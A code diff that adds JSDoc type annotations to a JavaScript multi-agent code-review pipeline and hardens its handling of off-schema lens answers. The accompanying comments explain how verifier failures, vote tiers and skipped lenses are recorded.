@@ -4228,7 +4909,7 @@ async function verifyPool(items, plan, profile, gateProvenance) {
     // always answer no, and the whole population would be bought.
     (verdictNeutralNow(group[0], floor)
       ? Promise.resolve(floorSkippedGroup(group))
-      : ragent(batchVerifyPrompt(group, profile), { label: `verify-batch:${group[0].file || '?'}(${group.length})`, phase: 'Verify', breaker, schema: BATCH_VERDICT_SCHEMA, model: CULL_MODEL })
+      : ragent(batchVerifyPrompt(group, profile), { label: `verify-batch:${/** @type {Finding} */ (group[0])['file'] || '?'}(${group.length})`, phase: 'Verify', breaker, schema: BATCH_VERDICT_SCHEMA, model: CULL_MODEL })
       .then(res => {
         // THE DISCRIMINATOR. `ragent` answers `null` for a dead agent (API error, skip, or the
         // per-agent deadline) after its one re-dispatch, and that is the DOMINANT death — not the
@@ -4236,12 +4917,13 @@ async function verifyPool(items, plan, profile, gateProvenance) {
         // outcome by a different route: nothing was judged. Either way the group is unverified.
         const death = batchDeath(res)
         if (death) return deadGroup(group, death)
-        return group.map((f, i) => {
-          const v = res.verdicts.find(x => x && x.index === i)
+        return group.map((/** @type {Finding} */ f, /** @type {number} */ i) => {
+          // `death` is null only for an answer carrying a non-empty verdict list, so `res` is set here.
+          const v = (res?.verdicts ?? []).find(x => x && x['index'] === i)
           // A missing index in a NON-EMPTY verdict list is a verifier that ran and lost one finding —
           // an inspection happened, so this keeps `suspected`. This is the one case that must NOT be
           // folded into the unverified tier, and the only thing that separates it from a death.
-          return v ? tierFromVotes(f, [v]) : { ...f, tier: 'suspected', why: `${f.why} (batch verifier returned no verdict for this finding)` }
+          return v ? tierFromVotes(f, [v]) : { ...f, tier: 'suspected', why: `${f['why']} (batch verifier returned no verdict for this finding)` }
         })
       })
       // A batch verifier that THREW — both `ragent` attempts failed — judged nothing, so its group
@@ -4252,8 +4934,8 @@ async function verifyPool(items, plan, profile, gateProvenance) {
       // denominator that is defined as what verification actually judged. One tier, one way in.
       // The verbatim error text is deliberately NOT carried into the finding or into `notRun`: see
       // the note on `deadGroup`. It is logged instead, where a unique string costs nothing.
-      .catch(err => {
-        log(`⚠️ [${profile.id}] batch verifier threw: ${String((err && err.message) || err).slice(0, 160)}`)
+      .catch((/** @type {unknown} */ err) => {
+        log(`⚠️ [${profile.id}] batch verifier threw: ${String((err && /** @type {{ message?: unknown }} */ (err).message) || err).slice(0, 160)}`)
         return deadGroup(group, 'died before returning any verdict')
       })))
 
@@ -4263,16 +4945,16 @@ async function verifyPool(items, plan, profile, gateProvenance) {
 
   const individualThunks = route.individual.map(f => () => {
     // Anything not produced by a review lens came from a deterministic tool (gate seeds: clippy-pedantic, statix, deadnix, semgrep, …) — except dep-context, a reasoning seed (see isToolSource).
-    const isTool = isToolSource(profile, f.source)
-    const isHigh = f.severity === 'Critical' || f.severity === 'High'
+    const isTool = isToolSource(profile, f['source'])
+    const isHigh = f['severity'] === 'Critical' || f['severity'] === 'High'
     const n1 = isHigh ? Math.max(1, plan.verifyVotes) : 1
     // Cull votes on the cheap model.
-    const cull = i => () =>
-      ragent(verifyPrompt(f, i, isTool, gateProvenance, profile), { label: `verify:${f.file || '?'}:${f.line || 0}#c${i + 1}`, phase: 'Verify', breaker, schema: VERDICT_SCHEMA, model: CULL_MODEL })
+    const cull = (/** @type {number} */ i) => () =>
+      ragent(verifyPrompt(f, i, isTool, gateProvenance, profile), { label: `verify:${f['file'] || '?'}:${f['line'] || 0}#c${i + 1}`, phase: 'Verify', breaker, schema: VERDICT_SCHEMA, model: CULL_MODEL })
     if (!isHigh) return parallel([cull(0)]).then(vs => tierFromVotes(f, vs))
     // A High/Critical always gets exactly one authoritative opus vote combined with the cull votes.
     const auth = () =>
-      ragent(verifyPrompt(f, n1, isTool, gateProvenance, profile), { label: `verify:${f.file || '?'}:${f.line || 0}#auth`, phase: 'Verify', breaker, schema: VERDICT_SCHEMA, model: plan.lensModel })
+      ragent(verifyPrompt(f, n1, isTool, gateProvenance, profile), { label: `verify:${f['file'] || '?'}:${f['line'] || 0}#auth`, phase: 'Verify', breaker, schema: VERDICT_SCHEMA, model: plan.lensModel })
     // Open with the DECIDING pair — one cheap cull plus the authoritative vote — and buy the remaining
     // cull votes only when those two disagree. tierFromVotes is a majority rule, so a unanimous pair
     // lands on exactly the tier a unanimous four would: the extra votes only ever change the outcome
@@ -4284,7 +4966,7 @@ async function verifyPool(items, plan, profile, gateProvenance) {
     return parallel([cull(0), auth]).then(async vs => {
       const opening = vs.filter(Boolean)
       if (opening.length === 2 && votesAgree(opening[0], opening[1])) return tierFromVotes(f, opening)
-      const rest = await parallel(Array.from({ length: Math.max(0, n1 - 1) }, (_unused, i) => cull(i + 1)))
+      const rest = await parallel(Array.from({ length: Math.max(0, n1 - 1) }, (/** @type {unknown} */ _unused, /** @type {number} */ i) => cull(i + 1)))
       return tierFromVotes(f, opening.concat(rest.filter(Boolean)))
     })
   })
@@ -4301,7 +4983,10 @@ async function verifyPool(items, plan, profile, gateProvenance) {
   // Every settled individual verdict is offered to the floor. Wrapped here rather than inside the
   // thunk because the thunk has two return points, and a floor raised on one path but not the other
   // is the kind of half-wiring that leaves the saving silently unrealized.
-  const withFloor = run => () => Promise.resolve(run()).then(r => {
+  // `run` is `individualThunks[i]` for an in-range `i` (both lists map `route.individual`), hence the
+  // cast; the result is typed as a window entry's so the batch thunks concatenate onto the same list.
+  /** @type {(run: (() => Promise<Finding>) | undefined) => () => Promise<Finding | Finding[]>} */
+  const withFloor = run => () => Promise.resolve(/** @type {() => Promise<Finding>} */ (run)()).then(r => {
     if (floor.record(r)) log(`💰 [${profile.id}] the verdict is now fixed at Block by a confirmed ${r.severity} (${r.file || '?'}:${r.line || 0}) — Medium batches not yet dispatched can no longer move it and will not be bought`)
     return r
   })
@@ -4320,9 +5005,12 @@ async function verifyPool(items, plan, profile, gateProvenance) {
   // back into its own findings by index (the batch side knows its group, the individual side its
   // finding) and routed exactly like every other death.
   const judged = settledVerdicts.slice(0, route.individual.length)
-    .map((r, i) => (r || NOT_VERIFIED(route.individual[i], 'the verifier panel for this finding was lost before it settled — nothing was checked against the code')))
+    // The first `route.individual.length` entries are individual thunks, each settling to ONE finding.
+    .map((r, i) => (/** @type {Finding | null | undefined} */ (r) || NOT_VERIFIED(/** @type {Finding} */ (route.individual[i]), 'the verifier panel for this finding was lost before it settled — nothing was checked against the code')))
   const batched = settledVerdicts.slice(route.individual.length)
-    .flatMap((r, i) => (r ? r : deadGroup(groups[i], 'was lost before it settled (its dispatch never produced a result)')))
+    // ...and the rest are batch thunks, each settling to its group's judged findings.
+    .flatMap((r, i) => (r ? /** @type {Finding[]} */ (r) : deadGroup(/** @type {Finding[]} */ (groups[i]), 'was lost before it settled (its dispatch never produced a result)')))
+  /** @type {Finding[]} */
   const settled = judged.concat(batched)
   // A dead batch's findings arrive through the same list as judged ones and must leave it again:
   // `vp` is the JUDGED population and every count derived from it (candidates, refuteRate) means
@@ -4353,8 +5041,8 @@ async function verifyPool(items, plan, profile, gateProvenance) {
       // deleted a finding on partial evidence. The deliberate floor skip is NOT here — see
       // `savedByFloor` below for why it cannot be.
       // Split on the flags tierFromVotes and floorSkippedGroup set, not on the wording of any `why`.
-      ...deaths.filter(f => !f.verifySkipped && !(f.votesDiscarded > 0)).map(f => `${profile.id} verification of ${f.file || '?'} — the verifier(s) died before returning a verdict, so those finding(s) were never checked against the code`),
-      ...deaths.filter(f => !f.verifySkipped && f.votesDiscarded > 0).map(f => `${profile.id} verification of ${f.file || '?'} — every returned vote answered OFF-SCHEMA and was discarded before the arithmetic, so those finding(s) were never checked against the code`),
+      ...deaths.filter(f => !f.verifySkipped && !((f.votesDiscarded ?? 0) > 0)).map(f => `${profile.id} verification of ${f.file || '?'} — the verifier(s) died before returning a verdict, so those finding(s) were never checked against the code`),
+      ...deaths.filter(f => !f.verifySkipped && (f.votesDiscarded ?? 0) > 0).map(f => `${profile.id} verification of ${f.file || '?'} — every returned vote answered OFF-SCHEMA and was discarded before the arithmetic, so those finding(s) were never checked against the code`),
       ...refuted.filter(f => (f.votesDiscarded || 0) > 0).map(f => `${profile.id} verification of ${f.file || '?'} — a finding was REFUTED and deleted from the run by a THINNED PANEL (at least one returned vote answered off-schema and was discarded), so the deletion rests on partial evidence`),
     ])],
     // OUT of `notRun` on purpose, and this is the same call that was already made once for
@@ -4387,6 +5075,7 @@ const RIGOR_BY_SIZE = {
 const LENS_MODEL = 'opus'
 
 // ================= Per-profile pipeline: scout → gate → lenses → verify → critic =================
+/** @param {Profile} profile */
 async function reviewProfile(profile) {
   // ---- Scout ----
   const scout = await ragent(scoutPrompt(profile), { label: `scout:${profile.id}`, schema: SCOUT_SCHEMA, model: 'haiku', effort: 'low', phase: 'Scout' })
@@ -4399,7 +5088,7 @@ async function reviewProfile(profile) {
     ? [`${profile.id} scout classification — the plan is the conservative fallback (all lenses, 3-vote, 2 rounds), not a scouted one`]
     : []
   // hasOwn, not truthiness: a bucket of "constructor" would index Object.prototype and pass.
-  const size = Object.hasOwn(RIGOR_BY_SIZE, scout?.sizeBucket ?? '') ? scout.sizeBucket : 'medium'
+  const size = /** @type {keyof typeof RIGOR_BY_SIZE} */ (Object.hasOwn(RIGOR_BY_SIZE, scout?.sizeBucket ?? '') ? scout?.sizeBucket : 'medium')
   // Lenses a BLANKET expansion of the roster must not include. A lens is a full agent — the
   // dominant per-run cost — and `failure-windows` is the heaviest in the Rust roster: it enumerates
   // every mutating request on the changed path and plays out each adjacent pair. Its premise is a
@@ -4416,11 +5105,12 @@ async function reviewProfile(profile) {
   // selected — by construction the whole optional set. It went ungated once and bought two of the
   // three on an ordinary large diff. It calls `admitted` too now; putting the gate anywhere but
   // under each of these leaves a door, because every one of them names lenses on its own signals.
-  const admitted = l => !OPTIONAL_LENSES.includes(l) || optionalRequested.includes(l)
-  const blanket = () => profile.lenses.filter(l => !CONDITIONAL_LENSES.includes(l) && admitted(l))
+  const admitted = (/** @type {string} */ l) => !OPTIONAL_LENSES.includes(l) || optionalRequested.includes(l)
+  const blanket = () => profile.lenses.filter((/** @type {string} */ l) => !CONDITIONAL_LENSES.includes(l) && admitted(l))
+  /** @type {Plan} */
   const plan = {
     sizeBucket: size,
-    lenses: (scout?.lenses?.length ? scout.lenses.filter(l => profile.lenses.includes(l) && admitted(l)) : blanket()),
+    lenses: (scout?.lenses?.length ? scout.lenses.filter((/** @type {string} */ l) => profile.lenses.includes(l) && admitted(l)) : blanket()),
     maxRounds: RIGOR_BY_SIZE[size].maxRounds,
     verifyVotes: RIGOR_BY_SIZE[size].verifyVotes,
     lensModel: LENS_MODEL,
@@ -4473,6 +5163,7 @@ async function reviewProfile(profile) {
   // Certain cross-boundary paths the scout can miss force their surfaces ON — never off, so this only
   // ever adds a lens back, never removes one.
   if (changedFiles.some(isContractOrSchemaPath)) { surfaces.crossBoundarySymbol = true; surfaces.wireForm = true }
+  /** @type {string[]} */
   const surfaceDropped = []
   plan.lenses = plan.lenses.filter(lens => {
     const need = SURFACE_GATED_LENSES[lens]
@@ -4483,7 +5174,7 @@ async function reviewProfile(profile) {
   // Only the UNIVERSE is recorded here: which optional lenses this profile could have bought. It rides
   // back on the profile's result; what ran is recorded at dispatch (`runLens`) and subtracted by
   // `optionalTally()`, because the plan is not final at this point — see the tally's definition.
-  const optionalScope = profile.lenses.filter(l => OPTIONAL_LENSES.includes(l))
+  const optionalScope = profile.lenses.filter((/** @type {string} */ l) => OPTIONAL_LENSES.includes(l))
   log(`[${profile.id}] ${scoutFailed ? '⚠️ scout did not return — conservative fallback plan' : (scout.notes || 'scout: classified')} · ${plan.sizeBucket}${plan.securitySensitive ? ' · SECURITY floor (all lenses, 3-vote)' : ''}${plan.lenses.includes('negative-space') ? ' · +negative-space' : ''}`)
 
   // Lens runner: prefer the profile's dedicated reviewer agent; if that agent type is not
@@ -4493,13 +5184,29 @@ async function reviewProfile(profile) {
   // with "agent type '<x>' not found". Both failure shapes are handled — a thrown /not found/ and
   // a null return (some runtimes signal an unknown agent type that way). Record the real failure
   // reason so INCOMPLETE reporting doesn't have to guess (budget vs registry vs death).
+  /** @type {Map<string, string>} */
   const lensFailures = new Map()
   let reviewerAgentMissing = false
   // Keyed by DISPATCH, not by lens name. Once a lens fans out over slices there are several live
   // dispatches under one name, and a name-keyed map keeps only the last failure — so the reported
   // reason would name one slice's error as if it were the lens's.
-  const dispatchKey = (lens, slice) => (slice ? `${lens} :: ${slice.key}` : lens)
+  const dispatchKey = (/** @type {string} */ lens, /** @type {Slice | null} */ slice) => (slice ? `${lens} :: ${slice.key}` : lens)
+  // An answer is model output: the schema shapes it, but an off-schema answer still arrives. One
+  // without a findings array did not review — counting it as returned would read `{}` as a clean lens
+  // and iterate a string or a number as findings. It is a lens failure with its own reason, so every
+  // caller (the round, the resurrection sweep, the critic follow-ups) sees exactly what a dead lens is.
+  /** @param {string} lens @param {string} prompt @param {string} phaseName @param {string} labelSuffix @param {Slice | null} [slice] @returns {Promise<FindingsAnswer | null>} */
   async function runLens(lens, prompt, phaseName, labelSuffix, slice = null) {
+    const res = await dispatchLens(lens, prompt, phaseName, labelSuffix, slice)
+    if (res != null && !Array.isArray(/** @type {{ findings?: unknown }} */ (res).findings)) {
+      lensFailures.set(dispatchKey(lens, slice), 'answered off-schema (no findings array)')
+      log(`⚠️ [${profile.id}] lens ${dispatchKey(lens, slice)} answered off-schema (no findings array) — counted as not returned`)
+      return null
+    }
+    return res
+  }
+  /** @param {string} lens @param {string} prompt @param {string} phaseName @param {string} labelSuffix @param {Slice | null} [slice] */
+  async function dispatchLens(lens, prompt, phaseName, labelSuffix, slice = null) {
     // The single dispatch point for every lens on every path. Recording here — not at plan time — is
     // what makes the report and the run record physically unable to disagree with what happened.
     if (OPTIONAL_LENSES.includes(lens)) optionalDispatched.add(lens)
@@ -4511,7 +5218,7 @@ async function reviewProfile(profile) {
       try {
         return await ragent(prompt, opts)
       } catch (e) {
-        lensFailures.set(dispatchKey(lens, slice), String((e && e.message) || e).slice(0, 160))
+        lensFailures.set(dispatchKey(lens, slice), String((e && /** @type {{ message?: unknown }} */ (e).message) || e).slice(0, 160))
         return null
       }
     }
@@ -4526,7 +5233,7 @@ async function reviewProfile(profile) {
       noteReviewerAgentFallback(profile)
       return await runGeneric()
     } catch (e) {
-      const msg = String((e && e.message) || e)
+      const msg = String((e && /** @type {{ message?: unknown }} */ (e).message) || e)
       // dispatchKey, like the other write to this map. Keyed by bare name the real error message was
       // looked up under a key nobody uses, so a sliced dispatch that died WITH a reason was reported
       // as "died without an error" — and any sibling slice could overwrite it.
@@ -4592,7 +5299,7 @@ async function reviewProfile(profile) {
   // Red, real, and NOT this diff's doing. Kept out of failedChecks so it cannot stop the review, and
   // out of notes so it cannot be quietly lost: it prints on every verdict, including a green one.
   const carriedChecks = gate?.carriedChecks ?? []
-  const seedFindings = (gate?.seedFindings ?? []).map(f => ({ ...f, source: f.source || 'tool' }))
+  const seedFindings = (gate?.seedFindings ?? []).map((/** @type {Finding} */ f) => ({ ...f, source: f['source'] || 'tool' }))
   log(`[${profile.id}] Gate: ${gateStatus} — ${gateProvenance}${failedChecks.length ? ` · failed: ${failedChecks.join(', ')}` : ''}${carriedChecks.length ? ` · ${carriedChecks.length} pre-existing (carried, not blocking)` : ''}`)
   // What a VERIFIER needs to run a tool, as opposed to what the RECORD needs to explain the gate.
   // Kept separate so the preflight's runner prefix never leaks into the persisted provenance string.
@@ -4625,7 +5332,7 @@ async function reviewProfile(profile) {
       : { status: 'unavailable' },
   }, 'Gate')
   if (gateStatus === 'fail') {
-    return { profile, plan, surfaceDropped, optionalScope, ranLenses: [], lensRounds: [], gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed: [], suspected: [], unverified: [], dropped: 0, notRun: [...scoutNotRun], criticNotes: '', probeViolations }
+    return { profile, plan, surfaceDropped, optionalScope, ranLenses: /** @type {string[]} */ ([]), lensRounds: [], gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed: [], suspected: [], unverified: [], dropped: 0, notRun: [...scoutNotRun], criticNotes: '', probeViolations }
   }
 
   // ---- Probe reviewer-agent availability ONCE up front ----
@@ -4638,7 +5345,7 @@ async function reviewProfile(profile) {
     try {
       await agent('Reply with the single word: OK.', { label: `probe:${profile.id}`, phase: 'Gate', model: 'haiku', effort: 'low', agentType: profile.reviewerAgent })
     } catch (e) {
-      const msg = String((e && e.message) || e)
+      const msg = String((e && /** @type {{ message?: unknown }} */ (e).message) || e)
       if (isAgentTypeMissing(msg, profile.reviewerAgent)) {
         reviewerAgentMissing = true; noteReviewerAgentMissing(profile, msg)
         log(`[${profile.id}] reviewer agent '${profile.reviewerAgent}' not registered — all lenses will use the generic subagent`)
@@ -4657,11 +5364,14 @@ async function reviewProfile(profile) {
   // comment still claimed a role, which is how a reader comes to believe there are two ledgers that
   // might disagree. A dispatch that was expected and never came back is a hole whatever its
   // siblings did, and that is the whole of it.
+  /** @type {Set<string>} */
   const expectedDispatches = new Set()
+  /** @type {Set<string>} */
   const returnedDispatches = new Set()
   const lensRounds = []
   // Lenses the completeness critic added and that were dispatched — on the record, because they change
   // what a round cost without changing its plan (lib/round-pairs.mjs compares them, realm #97).
+  /** @type {string[]} */
   let criticFollowupLenses = []
   // Computed ONCE for the whole profile, not per round: the changed-file set does not move between
   // rounds, and re-slicing per round would let a lens's slice key drift between round 1 and round 2
@@ -4673,7 +5383,7 @@ async function reviewProfile(profile) {
   if (diffSlices.length) log(`[${profile.id}] diff sliced into ${diffSlices.length} scope(s) for the code-intrinsic lenses: ${diffSlices.map(g => `${g.key} (${g.files.length})`).join(' · ')}. Whole-diff lenses (${WHOLE_DIFF_LENSES.join(', ')}) still see everything.`)
   // `[null]` means "one dispatch, unsliced" — the shape the caller had before slicing existed, so
   // the unsliced path stays the same code rather than a branch that can drift from it.
-  const lensSlicesFor = lens => (diffSlices.length && sliceableLens(lens) ? diffSlices : [null])
+  const lensSlicesFor = (/** @type {string} */ lens) => (diffSlices.length && sliceableLens(lens) ? diffSlices : [null])
   let dry = false
   for (let round = 1; round <= plan.maxRounds && !dry; round++) {
     const priorSummary = priorFoundSummary(pool)
@@ -4694,9 +5404,9 @@ async function reviewProfile(profile) {
     const settled = await weightedWindow(
       dispatches.map(d => ({ weight: 1, run: () => runLens(d.lens, lensPrompt(d.lens, priorSummary, profile, plan, d.slice), 'Lenses', ` r${round}${d.slice ? ` ${d.slice.key}` : ''}`, d.slice) })),
       LENS_WINDOW_AGENTS,
-      (run, i) => run().then(r => (r ? { ...r, __key: dispatchKey(dispatches[i].lens, dispatches[i].slice), __lens: dispatches[i].lens } : null)),
+      (run, i) => run().then(r => (r ? { ...r, __key: dispatchKey(/** @type {(typeof dispatches)[number]} */ (dispatches[i]).lens, /** @type {(typeof dispatches)[number]} */ (dispatches[i]).slice), __lens: /** @type {(typeof dispatches)[number]} */ (dispatches[i]).lens } : null)),
     )
-    const results = settled.filter(Boolean)
+    const results = settled.filter(r => r != null)
     // `__lens`, not the model's `lens` field. Coverage already avoided trusting it; the finding's
     // `source` and the ran-set did not, and a dispatch answering with a mangled name sent its
     // findings to `source: 'unknown'` while its dimension row read `ran: true` with zero findings —
@@ -4761,7 +5471,7 @@ async function reviewProfile(profile) {
       runLens(a.lens, lensPrompt(a.lens, priorSummary, profile, plan), 'Lenses', ` resurrect${sweep}`)
         .then(r => (r ? { ...r, __lens: a.lens } : null)),
     ))
-    const results = settled.filter(Boolean)
+    const results = settled.filter(r => r != null)
     for (const r of results) {
       const lens = r.__lens
       // A resurrection dispatch carries NO slice, so it reviewed the whole diff — which is exactly
@@ -4788,7 +5498,7 @@ async function reviewProfile(profile) {
     // only key its failure that way. Without the fallback every sliced hole read "died without an
     // error" even when the retry died with a captured message — losing the diagnosis for exactly
     // the sliced case, which is what keying by dispatch was introduced to fix.
-    const reasonFor = k => lensFailures.get(k) || lensFailures.get(String(k).split(' :: ')[0]) || 'returned no result (skipped or died without an error)'
+    const reasonFor = (/** @type {string} */ k) => lensFailures.get(k) || lensFailures.get(k.split(' :: ')[0] ?? k) || 'returned no result (skipped or died without an error)'
     const reasons = droppedLenses.map(k => `${k}: ${reasonFor(k)}`).join(' · ')
     notRun.push(`${profile.id} lenses that never returned — ${reasons}`)
     log(`⚠️ [${profile.id}] ${droppedLenses.length} lens dispatch(es) never returned (${reasons}). Review marked INCOMPLETE.`)
@@ -4811,7 +5521,7 @@ async function reviewProfile(profile) {
   await checkpoint(`${profile.id}-lenses`, {
     language: profile.id, branch, head, baseRef, round: thisRound, ranLenses, droppedLenses, lensRounds,
     candidates: summarizeFindings(pool),
-    candidatesBySource: pool.reduce((m, f) => ({ ...m, [f.source || 'unknown']: (m[f.source || 'unknown'] || 0) + 1 }), {}),
+    candidatesBySource: pool.reduce((m, f) => ({ ...m, [f.source || 'unknown']: (m[f.source || 'unknown'] || 0) + 1 }), /** @type {Record<string, number>} */ ({})),
     notRun,
   }, 'Lenses')
   if (!pool.length) {
@@ -4840,7 +5550,7 @@ async function reviewProfile(profile) {
   let criticNotes = ''
   const criticInScope = plan.sizeBucket === 'large' || plan.securitySensitive
   if (criticInScope && (!budget.total || budget.remaining() > 90000)) {
-    const candidates = profile.lenses.filter(l => !plan.lenses.includes(l))
+    const candidates = profile.lenses.filter((/** @type {string} */ l) => !plan.lenses.includes(l))
     const critic = await ragent(
       `You are a completeness critic for a ${profile.lang} review of the diff (base ${flattenField(baseRef) || 'HEAD'}).
 Lenses already run: ${plan.lenses.join(', ')}. Confirmed: ${confirmed.length}, Suspected: ${suspected.length}.
@@ -4855,9 +5565,9 @@ Also note in one line anything else likely missed (a changed file no finding tou
     // ("the scout classifies, the code budgets"); letting it re-order lenses on the synthesis phase
     // would return that spend through a side door and undo the boundary. The signal is not thrown
     // away — a refused name is carried to the reader as an uncovered surface, with how to buy it.
-    const named = (critic?.missingLenses ?? []).filter(l => candidates.includes(l))
+    const named = (critic?.missingLenses ?? []).filter((/** @type {string} */ l) => candidates.includes(l))
     for (const l of named) if (!admitted(l)) optionalNamedByCritic.add(l)
-    const refusedOptional = named.filter(l => !admitted(l))
+    const refusedOptional = named.filter((/** @type {string} */ l) => !admitted(l))
     if (refusedOptional.length) log(`[${profile.id}] Completeness critic named optional lens(es) ${refusedOptional.join(', ')} — NOT dispatched (the optional pass is bought by an explicit \`optional=\` request); reported as uncovered.`)
     // realm @nick/craft #102: the surface gate BINDS the critic too, mirroring `admitted()` above and
     // for the same reason. `candidates` is by construction the lenses NOT in the plan, so a lens the
@@ -4867,9 +5577,9 @@ Also note in one line anything else likely missed (a changed file no finding tou
     // this profile does not wrongly suppress another profile's critic. A named-and-dropped lens is
     // refused, carried to the reader as an uncovered surface, and kept out of the follow-up set.
     for (const l of named) if (surfaceDropped.includes(l)) surfaceGateNamedByCritic.add(l)
-    const refusedSurface = named.filter(l => surfaceDropped.includes(l))
+    const refusedSurface = named.filter((/** @type {string} */ l) => surfaceDropped.includes(l))
     if (refusedSurface.length) log(`[${profile.id}] Completeness critic named surface-gated lens(es) ${refusedSurface.join(', ')} — NOT dispatched (the diff does not touch the surface their defect class needs); reported as uncovered.`)
-    const followups = named.filter(l => admitted(l) && !surfaceDropped.includes(l))
+    const followups = named.filter((/** @type {string} */ l) => admitted(l) && !surfaceDropped.includes(l))
     if (followups.length && (!budget.total || budget.remaining() > 60000)) {
       log(`[${profile.id}] Completeness critic → follow-up lenses: ${followups.join(', ')}`)
       criticFollowupLenses = [...followups]
@@ -4879,15 +5589,15 @@ Also note in one line anything else likely missed (a changed file no finding tou
       // is skipped for lack of budget, records both. "The critic said run it and it died" is not a
       // cleaner outcome than "the critic said run it and there was no budget"; it is the same hole in
       // coverage, and the one a re-run can actually fix.
-      const settledExtra = await parallel(followups.map(lens => () =>
+      const settledExtra = await parallel(followups.map((/** @type {string} */ lens) => () =>
         runLens(lens, lensPrompt(lens, priorSummary, profile, plan), 'Synthesize', ' (critic)'),
       ))
-      const deadFollowups = followups.filter((_l, i) => !settledExtra[i])
+      const deadFollowups = followups.filter((/** @type {string} */ _l, /** @type {number} */ i) => !settledExtra[i])
       if (deadFollowups.length) {
-        notRun.push(...deadFollowups.map(l => `${profile.id} critic follow-up lens ${l} — dispatched and died before returning findings`))
+        notRun.push(...deadFollowups.map((/** @type {string} */ l) => `${profile.id} critic follow-up lens ${l} — dispatched and returned no findings (died, or answered off-schema)`))
         log(`⚠️ [${profile.id}] critic follow-up lens(es) ${deadFollowups.join('/')} died before returning findings — recorded as not run; the review is INCOMPLETE`)
       }
-      const extra = settledExtra.filter(Boolean).flatMap(r => r.findings || [])
+      const extra = settledExtra.filter(r => r != null).flatMap(r => r.findings || [])
       const fresh = extra.filter(f => { const k = key(f); if (seen.has(k)) return false; seen.add(k); return true })
       if (fresh.length) {
         const v = await verifyPool(await dedupPool(fresh, profile), plan, profile, toolProvenance)
@@ -4916,7 +5626,7 @@ Also note in one line anything else likely missed (a changed file no finding tou
 for (const p of active) results.push(await reviewProfile(p))
 
 // A red gate on any active language blocks the whole review (findings can't be trusted on a broken tree).
-const gateFailed = failedProfiles(results)
+const gateFailed = /** @type {Result[]} */ (failedProfiles(results))
 const runGate = gateRecord(results)
 const mergedProvenance = runGate.provenance
 const mergedGateStatus = runGate.status
@@ -4940,10 +5650,12 @@ const carriedLine = (() => {
 })()
 
 // A short, stable digest of a text, for recording WHAT a round was given without carrying the text.
+/** @param {string} text */
 function digest(text) {
   return [...String(text ?? '')].reduce((h, c) => ((h * 31) + c.charCodeAt(0)) >>> 0, 7).toString(16)
 }
 
+/** @param {Record<string, unknown>} extra */
 function reviewRecord(extra) {
   return {
     schemaVersion: 1,
@@ -4957,7 +5669,7 @@ function reviewRecord(extra) {
     languages: active.map(p => p.id),
     uncoveredFiles,
     lensRounds: results.flatMap(r => (r.lensRounds || []).map(x => ({ language: r.profile.id, ...x }))),
-    scout: results.map(r => ({ language: r.profile.id, size: r.plan.sizeBucket, lenses: r.plan.lenses, model: r.plan.lensModel, maxRounds: r.plan.maxRounds, verifyVotes: r.plan.verifyVotes, securitySensitive: !!r.plan.securitySensitive, isLibrary: !!r.plan.isLibrary })),
+    scout: results.map(r => ({ language: r.profile.id, size: r['plan'].sizeBucket, lenses: r['plan'].lenses, model: r['plan'].lensModel, maxRounds: r['plan'].maxRounds, verifyVotes: r['plan'].verifyVotes, securitySensitive: !!r['plan'].securitySensitive, isLibrary: !!r['plan'].isLibrary })),
     gate: runGate,
     // The optional pass, on the record: `skipped` is the field that keeps a cheap run from reading
     // later — in analyze-runs, in a comparison between two runs — as a full one.
@@ -4977,11 +5689,11 @@ function reviewRecord(extra) {
     // Every breach of the preflight probe budget, per language. Recorded on EVERY run, clean or
     // not: the point of the audit is that the next drift back into CI archaeology shows up in the
     // record of the run that did it, not in a re-measurement months later.
-    preflightProbeViolations: results.flatMap(r => (r.probeViolations || []).map(v => `[${r.profile.id}] ${v}`)),
+    preflightProbeViolations: results.flatMap(r => (r['probeViolations'] || []).map((/** @type {string} */ v) => `[${r.profile.id}] ${v}`)),
     // realm @nick/craft #104: did re-review memory engage this run, and if not, why. `chained` is false
     // with reason 'no-branch' on a detached HEAD — the silent round-1 degradation this field makes
     // legible in the record (the operator-facing half is reReviewMemorySection() in the report).
-    reReview: { chained: reReview.chained, reason: reReview.reason, basisVerdict: priorBasisVerdict, basisMismatch: priorBasisMismatch, basisOverridesLogger, fpComparable: priorFpComparable, tombstonesDropped: tombstonesDroppedForBasis, ledgerDegraded: priorLedgerDegraded, journalSourced: priorRoundJournalSourced, priorRound: priorRound?.round ?? null, priorHead: priorRound?.head ?? null },
+    reReview: { chained: reReview.chained, reason: reReview.reason, basisVerdict: priorBasisVerdict, basisMismatch: priorBasisMismatch, basisOverridesLogger, fpComparable: priorFpComparable, tombstonesDropped: tombstonesDroppedForBasis, ledgerDegraded: priorLedgerDegraded, journalSourced: priorRoundJournalSourced, priorRound: priorRound?.['round'] ?? null, priorHead: priorRound?.['head'] ?? null },
     // What the lenses were run over and how, so a later comparison of two rounds can tell a memory
     // effect from a scope or configuration effect (lib/round-pairs.mjs, realm @nick/craft #97): a
     // `delta` round on an unchanged head reviews an empty diff.
@@ -4995,7 +5707,7 @@ function reviewRecord(extra) {
     // round costs without being memory (lib/round-pairs.mjs, realm @nick/craft #97).
     base: baseRef || '',
     path: pathArg || '',
-    criticFollowups: results.flatMap(r => (r.criticFollowupLenses || []).map(l => `${r.profile.id}:${l}`)).sort(),
+    criticFollowups: results.flatMap(r => (r['criticFollowupLenses'] || []).map((/** @type {string} */ l) => `${r.profile.id}:${l}`)).sort(),
     intentDigest: digest(intentArg),
     // The author's description that reaches every lens (PR title/body or commit messages), and the
     // changed-file set the diff was taken over — both fetched each round, both change what a round does.
@@ -5007,14 +5719,14 @@ function reviewRecord(extra) {
 }
 
 if (gateFailed.length) {
-  await logRun(reviewRecord({ verdict: 'Block', round: thisRound, findings: summarizeFindings([]), dimensions: [], verification: null, notRun: [...scopeNotRun], failedChecks: gateFailed.flatMap(r => (r.failedChecks || []).map(c => `[${r.profile.id}] ${c}`)) }))
+  await logRun(reviewRecord({ verdict: 'Block', round: thisRound, findings: summarizeFindings([]), dimensions: [], verification: null, notRun: [...scopeNotRun], failedChecks: gateFailed.flatMap(r => (r.failedChecks || []).map((/** @type {string} */ c) => `[${r.profile.id}] ${c}`)) }))
   return out([
     `## Verdict`,
     `⛔ Block — mechanical gate is red (${gateFailed.map(r => r.profile.id).join(', ')}).`,
     ``,
     `## Gate`,
     mergedProvenance,
-    `\nFailed checks:\n${gateFailed.flatMap(r => (r.failedChecks || []).map(c => `- [${r.profile.id}] ${c}`)).join('\n')}`,
